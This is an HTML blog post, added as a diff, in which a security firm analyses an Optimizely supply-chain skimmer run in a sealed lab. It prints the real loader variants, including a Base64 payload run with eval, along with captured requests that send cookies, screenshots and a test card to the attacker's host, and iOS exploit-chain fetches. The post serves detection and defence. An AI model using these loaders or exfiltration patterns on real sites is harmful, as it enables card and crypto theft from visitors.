@@ -1,0 +1,275 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>I Ran the Optimizely Supply-Chain Skimmer in a Contained Lab: What It Steals and What CSP Didn&#x27;t Stop | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/optimizely-skimmer-detonated-in-a-lab/">
+<meta name="description" content="On 16 November 2026 malicious code was added to Optimizely Web snippets on 178 organisations&#x27; sites. I recovered ten real builds of the payload, ran the final one in a sealed Azure lab against fake shop, news and bank pages, and recorded every theft. The payload swapped wallet addresses, rewrote the clipboard and withdrawal fields, and skimmed a test card. On a site with a strict CSP it still stole the crypto, just without phoning home.">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/optimizely-skimmer-detonated-in-a-lab/">
+<meta property="og:title" content="I Ran the Optimizely Supply-Chain Skimmer in a Contained Lab: What It Steals and What CSP Didn&#x27;t Stop | Global SOC">
+<meta property="og:description" content="On 16 November 2026 malicious code was added to Optimizely Web snippets on 178 organisations&#x27; sites. I recovered ten real builds of the payload, ran the final one in a sealed Azure lab against fake shop, news and bank pages, and recorded every theft. The payload swapped wallet addresses, rewrote the clipboard and withdrawal fields, and skimmed a test card. On a site with a strict CSP it still stole the crypto, just without phoning home.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="I Ran the Optimizely Supply-Chain Skimmer in a Contained Lab: What It Steals and What CSP Didn&#x27;t Stop | Global SOC">
+<meta name="twitter:description" content="On 16 November 2026 malicious code was added to Optimizely Web snippets on 178 organisations&#x27; sites. I recovered ten real builds of the payload, ran the final one in a sealed Azure lab against fake shop, news and bank pages, and recorded every theft. The payload swapped wallet addresses, rewrote the clipboard and withdrawal fields, and skimmed a test card. On a site with a strict CSP it still stole the crypto, just without phoning home.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/optimizely-skimmer-detonated-in-a-lab/#article",
+      "url": "https://globalsoc.com.au/blog/optimizely-skimmer-detonated-in-a-lab/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/optimizely-skimmer-detonated-in-a-lab/"
+      },
+      "headline": "The Optimizely Skimmer, Detonated: Ten Real Builds, One Hidden Iframe, and Why CSP Wasn't Enough",
+      "description": "On 16 November 2026 malicious code was added to Optimizely Web snippets on 178 organisations' sites. I recovered ten real builds of the payload, ran the final one in a sealed Azure lab against fake shop, news and bank pages, and recorded every theft. The payload swapped wallet addresses, rewrote the clipboard and withdrawal fields, and skimmed a test card. On a site with a strict CSP it still stole the crypto, just without phoning home.",
+      "datePublished": "2026-11-18",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "The Optimizely Skimmer, Detonated: Ten Real Builds, One Hidden Iframe, and Why CSP Wasn't Enough",
+          "item": "https://globalsoc.com.au/blog/optimizely-skimmer-detonated-in-a-lab/"
+        }
+      ]
+    }
+  ]
+}
+</script>
+<meta property="article:published_time" content="2026-11-18">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="author" content="Yogesh">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f5f7fa;color:#142333;font:17px/1.75 system-ui,sans-serif}
+header{background:#0b2436;color:white;padding:25px max(24px,calc((100vw - 1000px)/2))}
+header a{color:#a6e3ff;text-decoration:none}
+header a:hover{text-decoration:underline}
+main{max-width:1000px;margin:auto;padding:40px 24px 80px}
+h1{font-size:clamp(34px,5vw,52px);line-height:1.15;letter-spacing:-.035em;margin:16px 0 20px}
+h2{margin-top:52px;line-height:1.3;font-size:28px;border-bottom:1px solid #d6e1e9;padding-bottom:8px}
+h3{margin-top:32px;font-size:20px}
+p{max-width:82ch;margin:16px 0}
+pre{background:#10283a;color:#e3f2fc;padding:20px;border-radius:10px;overflow:auto;font:13.5px/1.65 Consolas,monospace;white-space:pre-wrap;overflow-wrap:anywhere}
+code{font-family:Consolas,monospace;background:#e9f0f5;color:#0b2436;padding:2px 6px;border-radius:4px;font-size:0.9em}
+pre code{background:transparent;color:inherit;padding:0}
+a{color:#076383}
+nav.toc{background:#e6f0f5;border-left:4px solid #087da4;padding:16px 22px;margin:24px 0}
+.meta{color:#47687c;font-size:14px;font-weight:600;letter-spacing:0.04em}
+table{width:100%;border-collapse:collapse;background:white;font-size:15px;margin:20px 0}
+td,th{padding:12px;border:1px solid #d6e1e9;text-align:left}
+th{background:#edf3f7}
+td code{overflow-wrap:anywhere}
+.alert-box{background:#f0fdf4;border-left:4px solid #16a34a;padding:16px 20px;border-radius:4px;margin:20px 0}
+.warn-box{background:#fef2f2;border-left:4px solid #dc2626;padding:16px 20px;border-radius:4px;margin:20px 0}
+@media(max-width:640px){table{font-size:12px}td,th{padding:6px}}
+.bar{fill:#087da4}.small{font-size:14px;color:#47687c}
+.org{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:6px;letter-spacing:.03em;vertical-align:1px}
+.orgA{background:#fde7d9;color:#7a2e0b}.orgB{background:#dbeafe;color:#1e3a8a}
+.kc{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:8px;background:#0b2436;color:#a6e3ff;vertical-align:3px;letter-spacing:.03em}
+ul,ol{max-width:82ch}li{margin:6px 0}
+</style>
+</head>
+<body>
+<header>
+  <div style="display:flex;justify-content:space-between;align-items:center;">
+    <div><a href="/">Global SOC</a> / <a href="/blog/">Blog</a></div>
+    <div><a href="/dnsaudit/">DNS Audit</a></div>
+  </div>
+</header>
+<main>
+<p class="meta">THREAT RESEARCH &amp; LABS · Yogesh · 18 November 2026</p>
+<h1>The Optimizely Skimmer, Detonated: Ten Real Builds, One Hidden Iframe, and Why CSP Wasn&#x27;t Enough</h1>
+<p>On 16 November 2026 malicious code was added to Optimizely Web snippets on 178 organisations&#x27; sites. I recovered ten real builds of the payload, ran the final one in a sealed Azure lab against fake shop, news and bank pages, and recorded every theft. The payload swapped wallet addresses, rewrote the clipboard and withdrawal fields, and skimmed a test card. On a site with a strict CSP it still stole the crypto, just without phoning home.</p>
+<nav class="toc"><strong>Key Sections:</strong> Summary · How a Trusted Snippet Became a Loader · The Lab · Ten Builds in One Day · What It Did to a Victim · What It Sent Home · The iOS Branch · The CSP Test · What Your SOC Saw · New Findings · IOCs · Lessons</nav>
+<p class="small">A lab investigation, not a honeypot capture. Payload builds were recovered from the Internet Archive and checked against the SHA-256 values published by Report URI, StepSecurity and HECAVEX. Everything ran inside a sealed Azure lab: no request from the test browser reached the internet. Domains are defanged. Wallet addresses shown are the attacker's (published IOCs) or well-known public test addresses. The card is the standard Visa test number.</p>
+
+<h2 id="summary">1. Summary</h2>
+<p>On Monday 16 November 2026 someone gained write access to the <em>Project JavaScript</em> of customer projects on Optimizely Web, the A/B-testing platform. Project JavaScript is a box where a marketing team can type code that runs on every page view, with no engineering release. The attacker typed a loader into it. For roughly 16 hours, visitors to 178 organisations' sites, including major banks, broadcasters and retailers, ran the attacker's code. Report URI's Scott Helme raised the alarm. Most snippets were clean by 23:11 UTC, and the payload domain was put on <code>clientHold</code> at 00:37 UTC on 17 November.</p>
+<p>The company websites were not breached. The code arrived from <code>cdn.optimizely.com</code>, a domain those sites trust and allowlist, with a valid certificate. The payload, <code>track.js</code> on <code>1688360[.]cc</code>, was rebuilt 26 times in one day.</p>
+<p>The domain is dead now, so you can't watch it live. I wanted to see it act, so I rebuilt the attack in a lab:</p>
+<ul>
+<li>I recovered <strong>ten distinct builds</strong> from the Wayback Machine. Nine match published hashes. <strong>One has not been reported</strong>, and it adds a hidden iframe to a domain that isn't on any IOC list.</li>
+<li>I ran the final build in Edge and Chrome on three fake sites, one per loader variant, with a scripted "victim" who copies a deposit address, types a withdrawal address and pays with a test card.</li>
+<li>In the lab, every crypto address on the page was swapped within four seconds. The clipboard and the withdrawal field were rewritten. The test card went to <code>card.php</code>, and a screenshot of the hijacked page went to <code>hit.php</code>.</li>
+<li>On the site with a strict Content Security Policy, CSP blocked every byte of exfiltration, <strong>and the wallet theft still worked</strong>.</li>
+</ul>
+
+<h2 id="loader">2. How a Trusted Snippet Became a Loader</h2>
+<p>A site that uses Optimizely Web loads one tag, <code>https://cdn.optimizely.com/js/&lt;projectId&gt;.js</code>. Optimizely builds that file from the customer's project settings, including the Project JavaScript. The attacker didn't touch the CDN; the CDN served exactly what the project said. How they got write access to so many projects is still unconfirmed. Three loader shapes were reported, and my lab reproduces all three:</p>
+<pre><code>// Variant 1: plain script reference (seen on the Zoom snippet)
+var s=document.createElement('script');s.src='https://1688360[.]cc/track.js';s.async=true;
+document.head.appendChild(s);
+
+// Variant 2: the URL hidden in Base64, plus data-cfasync so Cloudflare Rocket Loader leaves it alone
+s.setAttribute('data-cfasync','false');s.src=atob('aHR0cHM6Ly8xNjg4MzYwLmNjL3RyYWNrLmpz');
+
+// Variant 3: the whole payload embedded in Base64, run with (0,eval) if the remote load fails
+// (seen on the BBC snippet; this is the "backup copy" that defeated a strict CSP)
+s.onerror=boot; setTimeout(function(){ if(!window._k7) boot(); },2500);
+function boot(){ (0,eval)(atob(P)); }</code></pre>
+<p>Variant 3 matters most. A CSP can stop the browser fetching <code>track.js</code>. It can't stop code that is already inside an allowed script, if the policy permits <code>eval</code>. Many sites that run tag managers and A/B tools allow <code>'unsafe-eval'</code>.</p>
+
+<h2 id="lab">3. The Lab</h2>
+<p>Two Azure VMs in their own VNet, with no peering. A Windows 11 VM with Edge and Chrome has no public IP. Its only route out is a Linux gateway. The gateway runs:</p>
+<ul>
+<li><strong>dnsmasq</strong> to answer every DNS query. In <em>contain</em> mode every name resolves to a sinkhole address, and only Microsoft domains resolve for real, for Defender.</li>
+<li><strong>mitmproxy</strong> in transparent mode, so all web traffic stops at the gateway. In contain mode every request is answered locally, even ones sent to a hard-coded IP, and every request body is saved.</li>
+<li><strong>iptables</strong> to drop all other forwarded traffic, plus <strong>tcpdump</strong> to record the lot.</li>
+</ul>
+<p>Before running anything I tested containment from inside Windows:</p>
+<pre><code>DNS example.com          -&gt; 198.18.0.10   (sinkhole)
+DNS google.com via 8.8.8[.]8 -&gt; 198.18.0.10 (forced through the gateway)
+HTTP to the C2's real IP -&gt; 200 X-WebSC=sinkhole
+TCP 1.1.1[.]1:853, 8.8.8[.]8:22 -&gt; blocked</code></pre>
+<p>The sinkhole served the real payload as <code>https://1688360[.]cc/track.js</code>. It also served replica Optimizely snippets (projects 9999991–3, clearly labelled as lab code) carrying the three loader variants, and three test sites built like a crypto-friendly bank page: deposit addresses, a withdrawal field and a card form. A Playwright script played the victim. After every run the report counted flows that were answered upstream. It was zero for every run.</p>
+
+<h2 id="builds">4. Ten Builds in One Day</h2>
+<p>The Wayback Machine crawled <code>track.js</code> 82 times on 16 November, often with the loader's <code>?cb=</code> cache-buster. The archived bytes are gzip-compressed. Once decompressed, they hash to these builds:</p>
+<table><thead><tr><th>Served (UTC)</th><th>Build</th><th>SHA-256 (first 16)</th><th>What changed</th></tr></thead><tbody>
+<tr><td>08:08</td><td>08:01, first</td><td><code>1ec4245b3b303304</code></td><td>A <strong>rule-engine kit</strong>: JSON rules with code in reversed Base64. Rule 5 is the clipper (ETH, BTC, TRON). Rule 2 loads the iOS router.</td></tr>
+<tr><td>12:08</td><td>11:57</td><td><code>6c4ba79e7c33c479</code></td><td>Engine dropped and logic hard-coded. Adds <code>hook.php</code> cookie polling, gated on HubSpot's <code>hsLoggedIn</code>.</td></tr>
+<tr><td>13:29</td><td>13:19</td><td><code>0a0b51d06647c249</code></td><td>By now: TON, SOL, LTC and BCH (added 12:47), the payment-keyword gate, and <code>hit.php</code> with html2canvas screenshots.</td></tr>
+<tr><td>15:48</td><td>15:28</td><td><code>e78dbfc1454a0c95</code></td><td>By now: the card skimmer (<code>card.php</code>, added 13:39), DOGE, <code>hook.php</code> removed (14:25), and patches to <code>Function.prototype.call/apply</code> (15:21).</td></tr>
+<tr><td>15:57</td><td>16:01</td><td><code>617df364120adc47</code></td><td>TON raw addresses (<code>0:&lt;hex&gt;</code>). These bytes were already live at 15:57.</td></tr>
+<tr><td><strong>16:00</strong></td><td><strong>unreported</strong></td><td><code>95084ed33db1416c</code></td><td>The same, plus a <strong>2-pixel iframe to <code>ua23[.]online/ch/pub03</code></strong> (section 10).</td></tr>
+<tr><td>16:04</td><td>16:01</td><td><code>617df364120adc47</code></td><td>Rolled back to the previous bytes. The redeploy explains the published 16:01:58 timestamp.</td></tr>
+<tr><td>16:27</td><td>16:11</td><td><code>450794992ffe035d</code></td><td><code>navigator.share</code> hook.</td></tr>
+<tr><td>17:10</td><td>17:05</td><td><code>814a963c0da480e2</code></td><td>Second iOS router (<code>eil786npto9u5bq[.]icu</code>).</td></tr>
+<tr><td>17:45</td><td>17:45</td><td><code>56db932faef107b4</code></td><td>Hidden iframe for iOS 18.6 and earlier.</td></tr>
+<tr><td>20:16</td><td>17:56, final</td><td><code>f7b84b9a94f749f8</code></td><td>Final build, live until the domain went on hold. This is the one I detonated.</td></tr>
+</tbody></table>
+<p>The first build gives the author away. It's a generic traffic kit: each rule has an ID, a name ("Crypto address clipper (all countries)"), a percentage, device targeting and Base64 code, and it calls <code>/_geo</code> and <code>/px</code> as <em>relative</em> paths on the page's own domain. That's a design for sites the operator controls. Dropped onto news and bank sites, those paths 404 or 405, and other researchers saw <code>POST /px</code> returning 405 on bbc.com. Rule IDs 5 and 2 suggest at least three other rules in the panel. HECAVEX only sees those relative paths in the 08:01 to 08:30 builds, so within about an hour the engine was gone and everything was hard-coded.</p>
+
+<h2 id="victim">5. What It Did to a Victim</h2>
+<p>The same result in Edge and Chrome, for all three loader variants:</p>
+<table><thead><tr><th>Victim action</th><th>What the page showed</th></tr></thead><tbody>
+<tr><td>Opens the deposit page</td><td>Within 4 s, ETH <code>0xd8dA…6045</code> → <code>0xC4026b06…17884e</code>, BTC <code>1A1zP1…DivfNa</code> → <code>19g9rZcP…c3kW</code>, TRON <code>TR7NHq…jLj6t</code> → <code>THvs6p56…sTYqxa</code></td></tr>
+<tr><td>Clicks "Copy ETH address"</td><td>Clipboard holds the <strong>attacker's</strong> ETH wallet</td></tr>
+<tr><td>Types their own withdrawal address and tabs out</td><td>Field silently rewritten to the attacker's wallet</td></tr>
+<tr><td>Pays with the test card</td><td>Page works normally; the card is sent to the attacker in parallel</td></tr>
+</tbody></table>
+<p>The clipper is careful. It doesn't swap anything that merely looks like an address. It decodes Base58Check and runs double SHA-256, checks Bech32 and CashAddr polynomials, and checks TON CRC16, so only valid addresses for the right chain are replaced. A word like <em>deposit</em>, <em>wallet</em>, <em>send</em> or <em>pay</em> must sit within 90 characters, which keeps false positives (and noise) low. It rescans the page every 50 ms. It also wraps every channel an address can travel through: text nodes, inputs (through the native value setter, so React and Angular see the change), links, <code>onclick</code> attributes, the copy event, the Clipboard API, <code>navigator.share</code>, <code>fetch</code>, XHR, <code>window.open</code> and <code>history.pushState</code>. From 15:21 it also wraps <code>Function.prototype.call</code> and <code>apply</code>, so any address passed through any function call is rewritten.</p>
+<p>The skimmer is just as fussy. It wants a Luhn-valid number with a known brand prefix (Troy, Mir and UnionPay are included), an expiry in the next 15 years, and a 3- or 4-digit CVV. It finds them in form submits and in <code>fetch</code> or XHR POST bodies, whether JSON, form-encoded or <code>FormData</code>. It can't read card fields inside a cross-origin payment iframe.</p>
+
+<h2 id="exfil">6. What It Sent Home</h2>
+<p>The sinkhole kept every byte. Within one page view:</p>
+<pre><code>POST https://1688360[.]cc/hit.php   text/plain, about 25 KB
+  {"u":"https://shop.websc-lab.test/","c":"&lt;document.cookie&gt;",
+   "i":"&lt;base64 JPEG&gt;","m":"0xd8dA… 1A1zP1… TR7NHq…"}
+
+POST https://1688360[.]cc/card.php  navigator.sendBeacon, 73 bytes
+  n=4111111111111111&amp;e=12/29&amp;c=123&amp;u=https://shop.websc-lab.test/</code></pre>
+<p><code>hit.php</code> fires only after a successful swap. It sends the page URL, readable cookies (up to 8,000 characters), the <em>original</em> addresses it replaced (so the operator knows what the victim expected) and a screenshot. Here is the screenshot the payload took of my test page and posted to the attacker:</p>
+<p><img src="attacker-screenshot.jpg" alt="Screenshot captured by the payload with html2canvas: every deposit address already replaced by the attacker's wallets" width="820" style="max-width:100%;height:auto;border:1px solid #d6e1e9"></p>
+<p>The card goes out with <code>sendBeacon</code>, which survives page navigation. A duplicate guard stores <code>cc_&lt;number&gt;&lt;expiry&gt;&lt;cvv&gt;</code> in <code>sessionStorage</code>, in plain text. That's a forensic artefact on any affected browser profile.</p>
+
+<h2 id="ios">7. The iOS Branch</h2>
+<p>I ran the same pages with an iPhone user agent (iOS 18.5). The payload added two scripts and a hidden iframe:</p>
+<pre><code>GET https://5vobauua3ojpklx[.]icu/boot.js     data-channel-code="02111110"
+GET https://eil786npto9u5bq[.]icu/boot.js
+GET https://eil786npto9u5bq[.]icu/JIUJIU888/weifile.html   (0x0 iframe at left:-1000px, iOS &lt;= 18.6)
+GET https://eil786npto9u5bq[.]icu/JIUJIU888/index.js      (requested by weifile.html)</code></pre>
+<p>The archived <code>weifile.html</code> is 346 bytes: no-cache headers and one <code>&lt;script src="index.js"&gt;</code>. Public reporting ties that path to the Coruna kit (iOS 13–17) and the <code>/B9/</code>, <code>/D11/</code> and <code>/D12/</code> paths to DarkSword (iOS 18.x). My lab never had those stages. The routers return an empty body to anything that isn't a real iPhone, and Chromium with an iPhone user agent is not an iPhone. So this run shows the delivery chain, not the exploit. The useful point for defenders is that the chain is noisy on the network: two <code>.icu</code> domains and a <code>JIUJIU888</code> path from a phone are easy to find in proxy or DNS logs.</p>
+
+<h2 id="csp">8. The CSP Test</h2>
+<p>Reporting said one bank's policy "stopped the main script and the data theft, and a backup copy ran anyway". I built that case. The bank test site sends:</p>
+<pre><code>Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.optimizely.com;
+  connect-src 'self' https://*.optimizely.com; img-src 'self' data:;
+  report-uri https://bank.websc-lab.test/csp-report</code></pre>
+<p>That's a reasonable policy for a site running an A/B tool. Here is what happened with loader variant 3:</p>
+<table><thead><tr><th>Step</th><th>Result</th></tr></thead><tbody>
+<tr><td>Load <code>1688360[.]cc/track.js</code></td><td><strong>Blocked</strong> by <code>script-src</code>, violation reported</td></tr>
+<tr><td><code>onerror</code> → <code>(0,eval)(atob(P))</code></td><td><strong>Ran</strong>, because <code>'unsafe-eval'</code> is allowed</td></tr>
+<tr><td>Load html2canvas from the payload host</td><td>Blocked, reported</td></tr>
+<tr><td>POST to <code>hit.php</code> (cookies, screenshot)</td><td>Blocked by <code>connect-src</code>, reported</td></tr>
+<tr><td>Beacon to <code>card.php</code></td><td>Blocked by <code>connect-src</code>, reported</td></tr>
+<tr><td>Swap deposit addresses, clipboard, withdrawal field</td><td><strong>All worked</strong></td></tr>
+</tbody></table>
+<p><img src="csp-site-still-hijacked.jpg" alt="The CSP-protected test bank page after the run: deposit addresses and the withdrawal field all show the attacker's wallet" width="820" style="max-width:100%;height:auto;border:1px solid #d6e1e9"></p>
+<p>CSP did its job on exfiltration, and the four violation reports are exactly the signal Report URI used to spot this campaign. But the clipper needs no network at all. It edits the page in place, and the victim sends the money. A policy that allows <code>'unsafe-eval'</code> for a third-party tool leaves that path open.</p>
+
+<h2 id="soc">9. What Your SOC Saw</h2>
+<p>In most enterprises the browsers were the exposure, not the servers. A typical finding looks like this. Endpoints show Edge or Chrome contacting <code>1688360[.]cc</code> or <code>webshell[.]lol</code> while users read a legitimate news site. Defender logs <code>ConnectionSuccess</code>, but the remote IP is in Cisco Umbrella's block range (<code>146.112.0.0/16</code>). I reproduced the network side of that in the lab's block mode: DNS returned a block-page IP, the browser connected to it and got a 403, and the payload never loaded.</p>
+<p>So <code>ConnectionSuccess</code> to a block IP is a <em>blocked</em> request, not a hit. There's one caveat the lab makes concrete. DNS blocking stops variants 1 and 2, but variant 3 carries the payload <em>inside</em> the Optimizely file, which DNS filtering allowed. For users who visited an affected site that served the embedded variant, "Umbrella blocked it" does not prove the clipper or skimmer didn't run. It only proves nothing was <em>sent</em> to the attacker's domain. In practice the risk is limited to people who paid by card or moved crypto on an affected site during those 16 hours. The <a href="/blog/detect-optimizely-supply-chain-skimmer/">detection post</a> shows how to tell the cases apart.</p>
+
+<h2 id="new">10. New Findings</h2>
+<ul>
+<li><strong>An unreported build with a hidden iframe.</strong> The Wayback Machine captured <code>track.js</code> at 16:00:45 UTC with SHA-256 <code>95084ed33db1416cc08d917f97bf8455e02c9216455647c3ec20841523766ebd</code> (28,717 bytes). That hash is not in the published 26-build lists. Its only difference from the build already live at 15:57 is one appended block:
+<pre><code>&lt;iframe src="https://ua23[.]online/ch/pub03" height="2" style="border:0;display:block"
+        referrerpolicy="no-referrer-when-downgrade"&gt;&lt;/iframe&gt;</code></pre>
+The referrer policy means the iframe host receives the full URL of every victim page. The archive saw the previous bytes again at 16:04, so the author rolled the change back within minutes. That redeploy is the published 16:01:58 Last-Modified time. <code>ua23[.]online</code> is behind Cloudflare and still resolves. The archive has three captures of a sibling channel, <code>/ch/blue02</code>, from 9–10 November, a week before the attack, and each returned an empty body to the crawler. I can't tell what the channel served. The naming (<code>ch/pub03</code>) and the referrer handling look like a traffic-distribution or monetisation feed. Treat the domain as an IOC and check your proxy logs for it.</li>
+<li><strong>A free hunting marker.</strong> Builds from 15:21 onward contain <code>TASK = 1;</code> with no declaration, so every infected page gets a global <code>window.TASK === 1</code>. Together with <code>_k7</code>, <code>_cc</code>, <code>_shot</code> and <code>_qxc</code>, that's a check any synthetic browser test can run against your own pages.</li>
+<li><strong>The first build was a rule engine.</strong> See section 4. It ties the operator to a reusable kit, not a one-off script.</li>
+</ul>
+
+<h2 id="iocs">11. IOCs</h2>
+<table><thead><tr><th>Type</th><th>Indicator</th><th>Note</th></tr></thead><tbody>
+<tr><td>Domain</td><td><code>1688360[.]cc</code></td><td>Payload, <code>hit.php</code>, <code>card.php</code>, <code>hook.php</code>, <code>html2canvas.min.js</code>, <code>px.gif?e=</code></td></tr>
+<tr><td>Domain</td><td><code>webshell[.]lol</code></td><td>Earlier injector, <code>/get.js</code></td></tr>
+<tr><td>Domain</td><td><code>5vobauua3ojpklx[.]icu</code>, <code>eil786npto9u5bq[.]icu</code></td><td>iOS routers, <code>/boot.js</code>, <code>/JIUJIU888/</code></td></tr>
+<tr><td>Domain</td><td><code>je4ft3gn8vxudum[.]icu</code>, <code>p55abnw2pnsz0bo[.]icu</code>, <code>1y69gy2mdzaltz1[.]icu</code>, <code>gm38duxoihbmy5o[.]icu</code>, <code>l7bcsnwc7nzr3uo[.]icu</code></td><td>Related iOS infrastructure (HECAVEX)</td></tr>
+<tr><td>Domain</td><td><code>ua23[.]online</code></td><td><strong>New</strong>: iframe <code>/ch/pub03</code> in the 16:00 build; <code>/ch/blue02</code> seen 9–10 Nov</td></tr>
+<tr><td>IP</td><td><code>136.113.106[.]136</code>, <code>34.96.213[.]201</code>, <code>34.87.36[.]58</code></td><td>Payload host and iOS routers (published)</td></tr>
+<tr><td>SHA-256</td><td><code>f7b84b9a94f749f8ced3f0112d0a66894e8bbc3b4aa5592021d1b8976a9bad40</code></td><td>Final build (detonated here)</td></tr>
+<tr><td>SHA-256</td><td><code>95084ed33db1416cc08d917f97bf8455e02c9216455647c3ec20841523766ebd</code></td><td><strong>New</strong>: 16:00 build with the <code>ua23</code> iframe</td></tr>
+<tr><td>SHA-256</td><td><code>1ec4245b3b303304ea24a89b3b2351b0f0c085087050f517d23dcba9694c165a</code></td><td>First build (rule engine)</td></tr>
+<tr><td>SHA-256</td><td><code>f286c965982bee4225c4edda261ce8685a55721dd997ddedf106666101118c07</code></td><td><code>JIUJIU888/weifile.html</code></td></tr>
+<tr><td>Wallet</td><td><code>0xC4026b06D82b0F0B363eda0642D61CfbDc17884e</code> (EVM), <code>19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW</code> (BTC), <code>THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa</code> (TRON)</td><td>Replacement addresses; see the published lists for TON, SOL, LTC, BCH and DOGE</td></tr>
+<tr><td>Page markers</td><td><code>window._k7</code>, <code>_cc</code>, <code>_shot</code>, <code>_qxc</code>, <code>window.TASK===1</code>; <code>sessionStorage["cc_…"]</code></td><td>Set by the payload</td></tr>
+<tr><td>Strings</td><td><code>data-channel-code="02111110"</code>, <code>track.js?cb=</code>, <code>(0,eval)(</code>, <code>aHR0cHM6Ly8xNjg4MzYwLmNjL3RyYWNrLmpz</code></td><td>Loader and iOS stage</td></tr>
+</tbody></table>
+
+<h2 id="lessons">12. Lessons</h2>
+<ul>
+<li><strong>Anything that can push JavaScript to production is production.</strong> Tag managers, A/B tools and chat widgets with a "custom code" box need the same access control as your deploy pipeline: SSO, MFA, least privilege, change alerts and a review step.</li>
+<li><strong>Allowlisting the vendor's domain is not a control against the vendor's content.</strong> Use Subresource Integrity where the file is static. Where it isn't (A/B snippets change often), monitor the file itself: hash it, diff it and alert on new domains, <code>atob(</code> or <code>eval(</code>.</li>
+<li><strong>Drop <code>'unsafe-eval'</code> if you can.</strong> In this lab it was the single setting between "CSP stopped the theft" and "CSP stopped the exfiltration but not the theft".</li>
+<li><strong>Collect CSP reports.</strong> Four violation reports per page view were the earliest, cheapest signal in this lab, and they're how the campaign was found.</li>
+<li><strong>Read block-page telemetry carefully.</strong> A connection to a DNS-filter block IP is a block. But when the payload is embedded in an allowed file, a block on the payload domain doesn't prove the code didn't run.</li>
+</ul>
+<p class="small">Sources: Report URI, "World's Largest Brands Infected With Malware Via Optimizely" (16–17 Nov 2026); StepSecurity, "OPTIMJACK" (17 Nov 2026); HECAVEX, "Optimizely track.js Malware: Reverse Engineering and Hunting" (17 Nov 2026). Build hashes, timeline and iOS-stage details not observed in my lab come from these reports.</p>
+<aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
+<footer>
+  <div style="max-width:1000px;margin:auto;padding:20px 24px;border-top:1px solid #d6e1e9;font-size:14px;color:#47687c;">
+    © 2026 Global SOC Pty Ltd · <a href="/privacy.html">Privacy Policy</a>
+  </div>
+</footer>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
